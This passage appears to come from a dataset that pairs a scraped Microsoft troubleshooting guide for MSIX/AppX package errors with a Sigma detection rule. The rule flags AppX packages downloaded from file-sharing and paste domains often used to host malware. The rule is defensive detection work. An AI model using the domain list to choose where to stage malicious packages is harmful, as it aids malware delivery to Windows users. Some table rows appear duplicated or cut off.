architecture|\n| **ERROR_DEV_SIDELOAD_**  <br>**LIMIT_EXCEEDED**                                                        | 0x80073D11 | You have reached the maximum number of developer sideloaded packages allowed on this device. Please uninstall a sideloaded package and try again|\n| **ERROR_INSTALL_OPTIONAL_**  <br>**PACKAGE_REQUIRES_**  <br>**MAIN_PACKAGE**                           | 0x80073D12 | A main app package is required to install this optional package. Install the main package first and try again|\n| **ERROR_PACKAGE_NOT_**  <br>**SUPPORTED_ON_FILESYSTEM**                                                | 0x80073D13 | This app package type is not supported on this filesystem|\n| **ERROR_PACKAGE_MOVE_**  <br>**BLOCKED_BY_STREAMING**                                                  | 0x80073D14 | Package move operation is blocked until the application has finished streaming|\n| **ERROR_INSTALL_OPTIONAL_**  <br>**PACKAGE_APPLICATIONID_**  <br>**NOT_UNIQUE**                        | 0x80073D15 | A main or another optional app package has the same application ID as this optional package. Change the application ID for the optional package to avoid conflicts|\n| **ERROR_PACKAGE_STAGING_**  <br>**ONHOLD**                                                             | 0x80073D16 | This staging session has been held to allow another staging operation to be prioritized|\n| **ERROR_INSTALL_INVALID_**  <br>**RELATED_SET_UPDATE**                                                 | 0x80073D17 | A related set cannot be updated because the updated set is invalid. All packages in the related set must be updated at the same time.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |\n| **ERROR_INSTALL_OPTIONAL_**  <br>**PACKAGE_REQUIRES_MAIN_**  <br>**PACKAGE_FULLTRUST_CAPABILITY**      | 0x80073D18 | An optional package with a FullTrust entry point requires the main package to have the **runFullTrust** capability|\n| **ERROR_DEPLOYMENT_BLOCKED_**  <br>**BY_USER_LOG_OFF**                                                 | 0x80073D19 | An error occurred because a user was logged off|\n| **ERROR_PROVISION_OPTIONAL_**  <br>**PACKAGE_REQUIRES_MAIN_**  <br>**PACKAGE_PROVISIONED**             | 0x80073D1A | An optional package provision requires the dependency main package to also be provisioned|\n| **ERROR_PACKAGES_REPUTATION_**  <br>**CHECK_FAILED**                                                   | 0x80073D1B | The packages failed the [SmartScreen reputation check](/en-us/windows/security/threat-protection/windows-defender-smartscreen/windows-defender-smartscreen-overview|\n| **ERROR_PACKAGES_REPUTATION_**  <br>**CHECK_TIMEDOUT**                                                 | 0x80073D1C | The [SmartScreen reputation check](/en-us/windows/security/threat-protection/windows-defender-smartscreen/windows-defender-smartscreen-overview) operation timed out|\n| **ERROR_DEPLOYMENT_OPTION_**  <br>**NOT_SUPPORTED**                                                    | 0x80073D1D | The current deployment option is not supported|\n| **ERROR_APPINSTALLER_**  <br>**ACTIVATION_BLOCKED**                                                    | 0x80073D1E | Activation is blocked due to the .appinstaller update settings for this app|\n| **ERROR_REGISTRATION_FROM_**  <br>**REMOTE_DRIVE_NOT_SUPPORTED**                                       | 0x80073D1F | Remote drives are not supported. Use **\\\\server\\\\share** to register a remote package.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |\n| **ERROR_APPX_RAW_**  <br>**DATA_WRITE_FAILED**                                                         | 0x80073D20 | Failed to process and write downloaded package data to disk.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |\n| **ERROR_DEPLOYMENT_BLOCKED_**  <br>**BY_VOLUME_POLICY_PACKAGE**                                        | 0x80073D21 | The deployment operation was blocked due to a per-package-family policy restricting deployments on a non-system volume. Per policy, this app must be installed to the system drive, but that's not set as the default. In Storage settings, make the system drive the default location to save new content, then retry the install.                                                                                                                                                                                                                                                                                                                                                                                                                                        |\n| **ERROR_DEPLOYMENT_BLOCKED_**  <br>**BY_VOLUME_POLICY_MACHINE**                                        | 0x80073D22 | The deployment operation was blocked due to a machine-wide policy restricting deployments on a non-system volume. Per policy, this app must be installed to the system drive, but that's not set as the default. In Storage settings, make the system drive the default location to save new content, then retry the install.                                                                                                                                                                                                                                                                                                                                                                                                                                              |\n| **ERROR_DEPLOYMENT_BLOCKED_**  <br>**BY_PROFILE_POLICY**                                               | 0x80073D23 | The deployment operation was blocked because special profile deployment is not allowed (special profiles are user profiles where changes are discarded after the user signs out). Try logging into an account that is not a special profile. You can try logging out and logging back into the current account, or try logging into a different account.                                                                                                                                                                                                                                                                                                                                                                                                                   |\n| **ERROR_DEPLOYMENT_FAILED_**  <br>**CONFLICTING_MUTABLE_PACKAGE_**  <br>**DIRECTORY**                  | 0x80073D24 | The deployment operation failed due to a conflicting package's [mutable package directory](/en-us/uwp/schemas/appxpackage/uapmanifestschema/element-desktop6-mutablepackagedirectory). To install this package, remove the existing package with the conflicting mutable package directory.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |\n| **ERROR_SINGLETON_RESOURCE_**  <br>**INSTALLED_IN_ACTIVE_USER**                                        | 0x80073D25 | The package installation failed because a singleton resource was specified and another user with that package installed is logged in. Make sure that all active users with the package installed are logged out and retry installation.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |\n| ERROR_DIFFERENT_VERSION_  <br>**OF_PACKAGED_SERVICE_INSTALLED**                                        | 0x80073D26 | The package installation failed because a different version of the service is installed. Try installing a newer version of the package|\n| **ERROR_SERVICE_EXISTS_**  <br>**AS_NON_PACKAGED_SERVICE**                                             | 0x80073D27 | The package installation failed because a version of the service exists outside of an .msix/.appx package. Contact your software vendor|\n| **ERROR_PACKAGED_SERVICE_**  <br>**REQUIRES_ADMIN_PRIVILEGES**                                         | 0x80073D28 | The package installation failed because administrator privileges are required. Contact an administrator to install this package|\n| **ERROR_REDIRECTION_TO_**  <br>**DEFAULT_ACCOUNT_NOT_ALLOWED**                                         | 0x80073D29 | The package deployment failed because the operation would have redirected to default account, when the caller said not to do so|\n| **ERROR_PACKAGE_LACKS_**  <br>**CAPABILITY_TO_DEPLOY_ON_HOST**                                         | 0x80073D2A | The package deployment failed because the package requires a capability to natively target this host|\n| **ERROR_UNSIGNED_PACKAGE_**  <br>**INVALID_CONTENT**                                                   | 0x80073D2B | The package deployment failed because its content is not valid for an unsigned package|\n| **ERROR_UNSIGNED_PACKAGE_**  <br>**INVALID_PUBLISHER_NAMESPACE**                                       | 0x80073D2C | The package deployment failed because its publisher is not in the unsigned namespace.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |\n| **ERROR_SIGNED_PACKAGE_**  <br>**INVALID_PUBLISHER_NAMESPACE**                                         | 0x80073D2D | The package deployment failed because its publisher is not in the signed namespace|\n| **ERROR_PACKAGE_EXTERNAL_**  <br>**LOCATION_NOT_ALLOWED**                                              | 0x80073D2E | The package deployment failed because its publisher is not in the signed namespace|\n| **ERROR_INSTALL_FULLTRUST_**  <br>**HOSTRUNTIME_REQUIRES_MAIN_**  <br>**PACKAGE_FULLTRUST_CAPABILITY** | 0x80073D2F | A host runtime dependency resolving to a package with full trust content requires the main package to have the **runFullTrust** capability|\n| **APPX_E_PACKAGING_INTERNAL**                                                                          | 0x80080200 | The packaging API has encountered an internal error.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |\n| **APPX_E_INTERLEAVING_**  <br>**NOT_ALLOWED**                                                          | 0x80080201 | The package isn't valid because its contents are interleaved|\n| **APPX_E_RELATIONSHIPS_**  <br>**NOT_ALLOWED**                                                         | 0x80080202 | The package isn't valid because it contains OPC relationships|\n| **APPX_E_MISSING_**  <br>**REQUIRED_FILE**                                                             | 0x80080203 | The package isn't valid because it's missing a manifest or block map, or a code integrity file is present but a signature file is missing.  <br>Ensure that the package isn't missing one or more of these required files:  <br><br>*   \\\\AppxManifest.xml<br>*   \\\\AppxBlockMap.xml<br><br>If the package contains \\\\AppxMetadata\\\\CodeIntegrity.cat, it must also contain \\\\AppxSignature.p7x.                                                                                                                                                                                                                                                                                                                                                                           |\n| **APPX_E_INVALID_MANIFEST**                                                                            | 0x80080204 | The package's AppxManifest.xml file isn't valid.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |\n| **APPX_E_INVALID_BLOCKMAP**                                                                            | 0x80080205 | The package's AppxBlockMap.xml file isn't valid|\n| **APPX_E_CORRUPT_CONTENT**                                                                             | 0x80080206 | The package contents can't be read because it's corrupted|\n| **APPX_E_BLOCK_**  <br>**HASH_INVALID**                                                                | 0x80080207 | The computed hash value of the block doesn't match the has value stored in the block map|\n| **APPX_E_REQUESTED_**  <br>**RANGE_TOO_LARGE**                                                         | 0x80080208 | The requested byte range is over 4 GB when translated to a byte range of blocks|\n| **TRUST_E_NOSIGNATURE**                                                                                | 0x800B0100 | No signature is present in the subject.  <br>You may get this error if the package is unsigned or the signature isn't valid. The package must be signed to be deployed|\n| **CERT_E_UNTRUSTEDROOT**                                                                               | 0x800B0109 | A certificate chain processed, but terminated in a root certificate which isn't trusted by the trust provider.  <br>See [Signing a package](/en-us/previous-versions/br230260(v=vs|\n| **CERT_E_CHAINING**                                                                                    | 0x800B010A | A certificate chain couldn't be built to a trusted root certification authority.  <br>See [Signing a package](/en-us/previous-versions/br230260(v=vs|\n| **APPX_E_INVALID_**  <br>**SIP_CLIENT_DATA**                                                           | 0x80080209 | The [**SIP_SUBJECTINFO**](/en-us/windows/win32/api/mssip/ns-mssip-sip_subjectinfo)structure used to sign the package didn't contain the required data|\n| **APPX_E_INVALID_**  <br>**KEY_INFO**                                                                  | 0x8008020A | The [**APPX_KEY_INFO**](/en-us/windows/win32/api/appxpackaging/ns-appxpackaging-appx_key_info) structure used to encrypt or decrypt the package contains invalid data|\n| **APPX_E_INVALID_**  <br>**CONTENTGROUPMAP**                                                           | 0x8008020B | The .msix/.appx package's content group map is invalid|\n| **APPX_E_INVALID_**  <br>**APPINSTALLER**                                                              | 0x8008020C | The [.appinstaller file](/en-us/windows/msix/app-installer/app-installer-root) for the package is invalid.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |\n| **APPX_E_DELTA_BASELINE_**  <br>**VERSION_MISMATCH**                                                   | 0x8008020D | The baseline package version in delta package does not match the version in the baseline package to be updated|\n| **APPX_E_DELTA_PACKAGE_**  <br>**MISSING_FILE**                                                        | 0x8008020E | The delta package is missing a file from the updated package|\n| **APPX_E_INVALID_**  <br>**DELTA_PACKAGE**                                                             | 0x8008020F | The delta package is invalid|\n| **APPX_E_DELTA_APPENDED_**  <br>**PACKAGE_NOT_ALLOWED**                                                | 0x80080210 | The delta appended package is not allowed for the current operation|\n| **APPX_E_INVALID_**  <br>**PACKAGING_LAYOUT**                                                          | 0x80080211 | The packaging layout file is invalid|\n| **APPX_E_INVALID_**  <br>**PACKAGESIGNCONFIG**                                                         | 0x80080212 | The packageSignConfig file is invalid|\n| **APPX_E_RESOURCESPRI_**  <br>**NOT_ALLOWED**                                                          | 0x80080213 | The resources.pri file is not allowed when there are no resource elements in the package manifest|\n| **APPX_E_FILE_**  <br>**COMPRESSION_MISMATCH**                                                         | 0x80080214 | The compression state of file in baseline and updated package does not match|\n| **APPX_E_INVALID_**  <br>**PAYLOAD_PACKAGE_EXTENSION**                                                 | 0x80080215 | Non .appx extensions are not allowed for payload packages targeting older platforms|\n| **APPX_E_INVALID_**  <br>**ENCRYPTION_EXCLUSION_FILE_LIST**                                            | 0x80080216 | The encryptionExclusionFileList file is invalid|\n\n## Applications don't start and their names are dimmed\n\nOn a computer running Windows 10 or later, you can't start some applications, and the application names appear dimmed.\n\n```image\nAlt: Some application names appear dimmed in the Start menu\nDescription: The image depicts a Windows Start menu containing a list of applications, some of which are dimmed. The highlighted application names include '7-Zip', 'Access 2016', 'Acrobat Distiller 6.0', 'Acrobat Reader DC', and 'Adobe Acrobat 6.0 Standard'. The dimmed appearance indicates that these applications may not be functioning properly, aligning with the troubleshooting context provided, which discusses issues related to application startup and error messages associated with certain Windows apps.\nTranscription: |\n  #\n  7-Zip\n  A\n  Access 2016\n  Acrobat Distiller 6.0\n  Acrobat Reader DC\n  Adobe Acrobat 6.0 Standard\n```\n\nWhen you try to open an application by selecting the dimmed name, you may receive one of the following error messages:\n\n> There's a problem with <em>application name</em>. Contact your system administrator about repairing or reinstalling it\n> Error: This app can't open\n\nAdditionally, the following event entries are logged in the \"Microsoft-Windows-TWinUI/Operational\" log under **Applications and Services\\Microsoft\\Windows\\Apps**:\n\n> Log Name: Microsoft-Windows-TWinUI/Operational\n> Source: Microsoft-Windows-Immersive-Shell\n> Date: <em>date</em>\n> Event ID: 5960\n> Task Category: (5960)\n> Level: Error\n> Keywords:\n> Description:\n> Activation of the app Microsoft.BingNews_8wekyb3d8bbwe!AppexNews for the Windows. Launch contract was blocked with error 0x80073CFC because its package is in state: Modified.\n\n### Cause\n\nThis issue occurs because the registry entry for the status value of application's corresponding package was modified.\n\n### Resolution\n\n> **Warning**\n> Serious problems might occur if you modify the registry incorrectly by using Registry Editor or by using another method. These problems might require that you reinstall the operating system. Microsoft cannot guarantee that these problems can be solved. Modify the registry at your own risk.\n\nTo fix this issue:\n\n1. Start Registry Editor, and then locate the **HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppModel\\StateChange\\PackageList** subkey.\n2. To back up the subkey data, right-click **PackageList**, select **Export**, and then save the data as a registry file.\n3. For each of the applications that are listed in the Event ID 5960 log entries, follow these steps:\n   1. Locate the **PackageStatus** entry.\n   2. Set the value of **PackageStatus** to zero (**0**).\n\n   > **Note**\n   > If there are no entries for the application under **PackageList**, then the issue has some other cause. In the case of the example event in this article, the full subkey is **HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppModel\\StateChange\\PackageList\\Microsoft.BingNews_8wekyb3d8bbwe!AppexNews\\PackageStatus**.\n\n4. Restart the computer.\n\n## Get additional help\n\nIf you need further help with resolving a problem you are experiencing when packaging, deploying, or querying a Windows app package (.msix/.appx) as a developer, refer to these additional developer support resources.\n\n- Microsoft Q&A offers relevant and timely answers to your technical problems from a community of experts and Microsoft engineers.\n- For community assistance with development questions, there are our forums, and StackOverflow.\n- The Windows developer support site explains other support options.\n\n## Related topics\n\n- How to sign an app package using SignTool\n- How to troubleshoot app package signature errors",
    "sigma_rule": {
      "title": "Suspicious Remote AppX Package Locations",
      "id": "8b48ad89-10d8-4382-a546-50588c410f0d",
      "status": "experimental",
      "description": "Detects an appx package added to the pipeline of the \"to be processed\" packages which was downloaded from a suspicious domain.\n",
      "references": [
        "Internal Research",
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
        "https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting",
        "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "modified": "2024-08-22",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "service": "appxdeployment-server"
      },
      "detection": {
        "selection": {
          "EventID": 854,
          "Path|contains": [
            ".githubusercontent.com",
            "anonfiles.com",
            "cdn.discordapp.com",
            "ddns.net",
            "dl.dropboxusercontent.com",
            "ghostbin.co",
            "glitch.me",
            "gofile.io",
            "hastebin.com",
            "mediafire.com",
            "mega.nz",
            "onrender.com",
            "pages.dev",
            "paste.ee",
            "pastebin.com",
            "pastebin.pl",
            "pastetext.net",
            "privatlab.com",
            "privatlab.net",
            "send.exploit.in",
            "sendspace.com",
            "storage.googleapis.com",
            "storjshare.io",
            "supabase.co",
            "temp.sh",
            "transfer.sh",
            "trycloudflare.com",
            "ufile.io",
            "w3spaces.com",
            "workers.dev"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\appxdeployment_server\\win_appxdeployment_server_susp_domains.yml",
    "id": "705"
  },
  {
    "url": "https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting",
    "markdown": "# Troubleshooting packaging, deployment, and query of Windows apps\n\nUse these suggestions to troubleshoot problems you experience when packaging, deploying, or querying a Windows app package (.msix/.appx) as a developer.\n\n> **Note**\n> This article is intended for developers. If you are not a developer and you are looking for help with a Windows app installation error, see Windows support.\n\n## Get diagnostic information\n\nWhen an API fails, it returns an error code that describes the problem. If the error code doesn't provide enough information, you find more diagnostic information in the detailed event logs.\n\nTo access the packaging and deployment event logs by using **Event Viewer**, follow these steps:\n\n1. Perform one of the following steps:\n   - Click **Start** on the Windows menu, type **Event Viewer**, and press **Enter**.\n   - Run **eventvwr.msc**.\n2. In the left page, expand **Event Viewer (Local) > Applications and Services Logs > Microsoft > Windows**.\n3. Check for available logs under these categories:\n   - **AppxPackagingOM > Microsoft-Windows-AppxPackaging/Operational**\n   - **AppXDeployment-Server > Microsoft-Windows-AppXDeploymentServer/Operational**\n\nStart by looking at the logs under **AppXDeployment-Server**. If the error was caused by **0x80073CF0** or **ERROR_INSTALL_OPEN_PACKAGE_FAILED**, additional details may be present in the **AppxpackagingOM** logs.\n\nYou can also use the Get-AppxLog command in PowerShell to get the first few logged events. The following example displays the logs associated with the most recent deployment operation.\n\n```\nGet-Appxlog\n```\n\nThe following example displays the logs associated with the most recent deployment operation in an interactive table in a separate window.\n\n```\nGet-Appxlog | Out-GridView\n```\n\n## Common error codes\n\nThis table lists some of the most common error codes. If you need further help with one of these errors, or if you're encountering an error code not in this list, see additional help options.\n\n| Error code                                                                                             | Value      | Description and possible causes|\n| ------------------------------------------------------------------------------------------------------ | ---------- ||\n| **E_FILENOTFOUND**                                                                                     | 0x80070002 | File or path is not found. This can occur during a COM typelib validation requires that the path for the directory actually exist within your MSIX package|\n| **ERROR_BAD_FORMAT**                                                                                   | 0x8007000B | The package isn't correctly formatted and needs to be re-built or re-signed.  <br>You may get this error if there is a mismatch between the signing certificate subject name and the AppxManifest.xml publisher name.  <br>See [How to sign an app package using SignTool](how-to-sign-a-package-using-signtool).                                                                                                                                                                                                                                                                                                                                                                                                                                                          |\n| **E_INVALIDARG**                                                                                       | 0x80070057 | One or more arguments are not valid. If you check the AppXDeployment-Server event log and see the following event: \"While installing the package, the system failed to register the windows.repositoryExtension extension due to the following error: The parameter is incorrect.\"  <br>You may get this error if the manifest elements DisplayName or Description contain characters disallowed by Windows firewall such as `\\                                                                                                                                                                                                                                                                                                                                            | `, due to which Windows fails to create the AppContainer profile for the package. Please remove these characters from the manifest and try installing the package. |\n| **ERROR_INSTALL_OPEN_**  <br>**PACKAGE_FAILED**                                                        | 0x80073CF0 | The package couldn't be opened.  <br>Possible causes:  <br><br>*   The package is unsigned.<br>*   The publisher name doesn't match the signing certificate subject.<br>*   The file:// prefix is missing or the package couldn't be found at the specified location.<br><br>For more information, check the **AppxPackagingOM** event log.                                                                                                                                                                                                                                                                                                                                                                                                                                |\n| **ERROR_INSTALL_PACKAGE_**  <br>**NOT_FOUND**                                                          | 0x80073CF1 | The package couldn't be found.  <br>You may get this error while removing a package that isn't installed for the current user|\n| **ERROR_INSTALL_INVALID_**  <br>**PACKAGE**                                                            | 0x80073CF2 | The package data isn't valid|\n| **ERROR_INSTALL_RESOLVE_**  <br>**DEPENDENCY_FAILED**                                                  | 0x80073CF3 | The package failed update, dependency, or conflict validation.  <br>Possible causes:  <br><br>*   The incoming package conflicts with an installed package.<br>*   A specified package dependency can't be found.<br>*   The package doesn't support the correct processor architecture.<br><br>For more informtion, check the **AppXDeployment-Server** event log.                                                                                                                                                                                                                                                                                                                                                                                                        |\n| **ERROR_INSTALL_OUT_**  <br>**OF_DISK_SPACE**                                                          | 0x80073CF4 | There isn't enough disk space on your computer. Free some space and try again|\n| **ERROR_INSTALL_NETWORK_**  <br>**FAILURE**                                                            | 0x80073CF5 | The package can't be downloaded|\n| **ERROR_INSTALL_**  <br>**REGISTRATION_FAILURE**                                                       | 0x80073CF6 | The package can't be registered.  <br>For more information, check the **AppXDeployment-Server** event log|\n| **ERROR_INSTALL_**  <br>**DEREGISTRATION_EFAILURE**                                                    | 0x80073CF7 | The package can't be unregistered.  <br>You may get this error while removing a package.  <br>For more information, check the **AppXDeployment-Server** event log|\n| **ERROR_INSTALL_CANCEL**                                                                               | 0x80073CF8 | The user canceled the install request|\n| **ERROR_INSTALL_FAILED**                                                                               | 0x80073CF9 | Package install failed. Contact the software vendor.  <br>For more information, check the **AppXDeployment-Server** event log|\n| **ERROR_REMOVE_FAILED**                                                                                | 0x80073CFA | Package removal failed.  <br>You may get this error for failures that occur during package uninstall.  <br>For more information, see [**RemovePackageAsync**](/en-us/uwp/api/windows.management.deployment.packagemanager.removepackageasync|\n| **ERROR_PACKAGE_**  <br>**ALREADY_EXISTS**                                                             | 0x80073CFB | The provided package is already installed, and reinstallation of the package is blocked.  <br>You may get this error if installing a package that is not bitwise identical to the package that is already installed. Note that the digital signature is also part of the package. Hence if a package is rebuilt or resigned, it is no longer bitwise identical to the previously installed package. Two possible options to fix this error are: (1) Increment the version number of the app, then rebuild and resign the package (2) Remove the old package for every user on the system before installing the new package.                                                                                                                                                |\n| **ERROR_NEEDS_REMEDIATION**                                                                            | 0x80073CFC | The app can't be started. Try reinstalling the app|\n| **ERROR_INSTALL_**  <br>**PREREQUISITE_FAILED**                                                        | 0x80073CFD | A specified install prerequisite couldn't be satisfied.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |\n| **ERROR_PACKAGE_**  <br>**REPOSITORY_CORRUPTED**                                                       | 0x80073CFE | The package repository is corrupted.  <br>You may get this error if the folder referenced by this registry key doesn't exist or is corrupted:  <br>**HKLM\\\\Software\\\\Microsoft\\\\Windows</strong>  <br>**CurrentVersion\\\\Appx\\\\PackageRepositoryRoot**  <br>To recover from this state, refresh your PC.  <br>**                                                                                                                                                                                                                                                                                                                                                                                                                                                            |\n| **ERROR_INSTALL_**  <br>**POLICY_FAILURE**                                                             | 0x80073CFF | To install this app, you need a developer license or a sideloading-enabled system.  <br>You may get this error if the package doesn't meet one of the following requirements:  <br><br>*   The app is deployed using F5 in Visual Studio on a computer with a Windows developer license.<br>*   The package is signed with a Microsoft signature and deployed as part of Windows or from the Microsoft Store.<br>*   The package is signed with a trusted signature and installed on a computer with a developer license, a domain-joined computer with the AllowAllTrustedApps policy enabled, or a computer with a Windows Sideloading license with the AllowAllTrustedApps policy enabled.                                                                              |\n| **ERROR_PACKAGE_UPDATING**                                                                             | 0x80073D00 | The app can't be started because it's currently updating|\n| **ERROR_DEPLOYMENT_**  <br>**BLOCKED_BY_POLICY**                                                       | 0x80073D01 | The package deployment operation is blocked by policy. Contact your system administrator.  <br>Possible causes:  <br><br>*   Package deployment is blocked by Application Control Policies.<br>*   Package deployment is blocked by the \"Allow deployment operations in special profiles\" policy.<br><br>One of the possible reasons is a need for a roaming profile. For information about setting up Roaming User Profiles on user accounts, see [Deploy Roaming User Profiles](/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/jj649079(v=ws.11)). If there are no policies configured on your system and you still see this error, perhaps you are logged in with a temporary profile. Log out and log in again, then try the operation again. |\n| **ERROR_PACKAGES_IN_USE**                                                                              | 0x80073D02 | The package couldn't be installed because resources it modifies are currently in use|\n| **ERROR_RECOVERY_**  <br>**FILE_CORRUPT**                                                              | 0x80073D03 | The package couldn't be recovered because data that's necessary for recovery is corrupted|\n| **ERROR_INVALID_**  <br>**STAGED_SIGNATURE**                                                           | 0x80073D04 | The signature isn't valid. To register in developer mode, AppxSignature.p7x and AppxBlockMap.xml must be valid or shouldn't be present.  <br>If you are a developer using F5 with Visual Studio, ensure that your built project directory doesn't contain signature or block map files from previous versions of the package.                                                                                                                                                                                                                                                                                                                                                                                                                                              |\n| **ERROR_DELETING_EXISTING_**  <br>**APPLICATIONDATA_STORE_FAILED**                                     | 0x80073D05 | An error occurred while deleting the package's previously existing application data.  <br>You can get this error if the [simulator](/en-us/previous-versions/hh441475(v=vs.110)) is running. Close the simulator. You can also get this error if there are files open in the app data (for example, if you have a log file open in a text editor).                                                                                                                                                                                                                                                                                                                                                                                                                         |\n| **ERROR_INSTALL_**  <br>**PACKAGE_DOWNGRADE**                                                          | 0x80073D06 | The package couldn't be installed because a higher version of this package is already installed.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |\n| **ERROR_SYSTEM_**  <br>**NEEDS_REMEDIATION**                                                           | 0x80073D07 | An error in a system binary was detected. To fix the problem, try refreshing the|\n| **ERROR_APPX_INTEGRITY_**  <br>**FAILURE_EXTERNAL**                                                    | 0x80073D08 | A corrupted non-Windows binary was detected on the system|\n| **ERROR_RESILIENCY_**  <br>**FILE_CORRUPT**                                                            | 0x80073D09 | The operation couldn't be resumed because data that's necessary for recovery is corrupted|\n| **ERROR_INSTALL_FIREWALL_**  <br>**SERVICE_NOT_RUNNING**                                               | 0x80073D0A | The package couldn't be installed because the Windows Firewall service isn't running. Enable the Windows Firewall service and try again|\n| **ERROR_PACKAGE_MOVE_FAILED**                                                                          | 0x80073D0B | The package move operation failed|\n| **ERROR_INSTALL_VOLUME_**  <br>**NOT_EMPTY**                                                           | 0x80073D0C | The deployment operation failed because the volume is not empty|\n| **ERROR_INSTALL_VOLUME_**  <br>**OFFLINE**                                                             | 0x80073D0D | The deployment operation failed because the volume is offline. For a package update, the volume refers to the installed volume of all package versions.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |\n| **ERROR_INSTALL_VOLUME_**  <br>**CORRUPT**                                                             | 0x80073D0E | The deployment operation failed because the specified volume is corrupt|\n| **ERROR_NEEDS_REGISTRATION**                                                                           | 0x80073D0F | The deployment operation failed because the specified application needs to be registered first.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |\n| **ERROR_INSTALL_WRONG_**  <br>**PROCESSOR_ARCHITECTURE**                                               | 0x80073D10 | The deployment operation failed because the package targets the wrong processor architecture|\n| **ERROR_DEV_SIDELOAD_**  <br>**LIMIT_EXCEEDED**                                                        | 0x80073D11 | You have reached the maximum number of developer sideloaded packages allowed on this device. Please uninstall a sideloaded package and try again|\n| **ERROR_INSTALL_OPTIONAL_**  <br>**PACKAGE_REQUIRES_**  <br>**MAIN_PACKAGE**                           | 0x80073D12 | A main app package is required to install this optional package. Install the main package first and try again|\n| **ERROR_PACKAGE_NOT_**  <br>**SUPPORTED_ON_FILESYSTEM**                                                | 0x80073D13 | This app package type is not supported on this filesystem|\n| **ERROR_PACKAGE_MOVE_**  <br>**BLOCKED_BY_STREAMING**                                                  | 0x80073D14 | Package move operation is blocked until the application has finished streaming|\n| **ERROR_INSTALL_OPTIONAL_**  <br>**PACKAGE_APPLICATIONID_**  <br>**NOT_UNIQUE**                        | 0x80073D15 | A main or another optional app package has the same application ID as this optional package. Change the application ID for the optional package to avoid conflicts.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |\n| **ERROR_PACKAGE_STAGING_**  <br>**ONHOLD**                                                             | 0x80073D16 | This staging session has been held to allow another staging operation to be prioritized|\n| **ERROR_INSTALL_INVALID_**  <br>**RELATED_SET_UPDATE**                                                 | 0x80073D17 | A related set cannot be updated because the updated set is invalid. All packages in the related set must be updated at the same time|\n| **ERROR_INSTALL_OPTIONAL_**  <br>**PACKAGE_REQUIRES_MAIN_**  <br>**PACKAGE_FULLTRUST_CAPABILITY**      | 0x80073D18 | An optional package with a FullTrust entry point requires the main package to have the **runFullTrust** capability|\n| **ERROR_DEPLOYMENT_BLOCKED_**  <br>**BY_USER_LOG_OFF**                                                 | 0x80073D19 | An error occurred because a user was logged off|\n| **ERROR_PROVISION_OPTIONAL_**  <br>**PACKAGE_REQUIRES_MAIN_**  <br>**PACKAGE_PROVISIONED**             | 0x80073D1A | An optional package provision requires the dependency main package to also be provisioned|\n| **ERROR_PACKAGES_REPUTATION_**  <br>**CHECK_FAILED**                                                   | 0x80073D1B | The packages failed the [SmartScreen reputation check](/en-us/windows/security/threat-protection/windows-defender-smartscreen/windows-defender-smartscreen-overview|\n| **ERROR_PACKAGES_REPUTATION_**  <br>**CHECK_TIMEDOUT**                                                 | 0x80073D1C | The [SmartScreen reputation check](/en-us/windows/security/threat-protection/windows-defender-smartscreen/windows-defender-smartscreen-overview) operation timed out.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |\n| **ERROR_DEPLOYMENT_OPTION_**  <br>**NOT_SUPPORTED**                                                    | 0x80073D1D | The current deployment option is not supported|\n| **ERROR_APPINSTALLER_**  <br>**ACTIVATION_BLOCKED**                                                    | 0x80073D1E | Activation is blocked due to the .appinstaller update settings for this app|\n| **ERROR_REGISTRATION_FROM_**  <br>**REMOTE_DRIVE_NOT_SUPPORTED**                                       | 0x80073D1F | Remote drives are not supported. Use **\\\\server\\\\share** to register a remote package|\n| **ERROR_APPX_RAW_**  <br>**DATA_WRITE_FAILED**                                                         | 0x80073D20 | Failed to process and write downloaded package data to disk.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |\n| **ERROR_DEPLOYMENT_BLOCKED_**  <br>**BY_VOLUME_POLICY_PACKAGE**                                        | 0x80073D21 | The deployment operation was blocked due to a per-package-family policy restricting deployments on a non-system volume. Per policy, this app must be installed to the system drive, but that's not set as the default. In Storage settings, make the system drive the default location to save new content, then retry the install.                                                                                                                                                                                                                                                                                                                                                                                                                                        |\n| **ERROR_DEPLOYMENT_BLOCKED_**  <br>**BY_VOLUME_POLICY_MACHINE**                                        | 0x80073D22 | The deployment operation was blocked due to a machine-wide policy restricting deployments on a non-system volume. Per policy, this app must be installed to the system drive, but that's not set as the default. In Storage settings, make the system drive the default location to save new content, then retry the install.                                                                                                                                                                                                                                                                                                                                                                                                                                              |\n| **ERROR_DEPLOYMENT_BLOCKED_**  <br>**BY_PROFILE_POLICY**                                               | 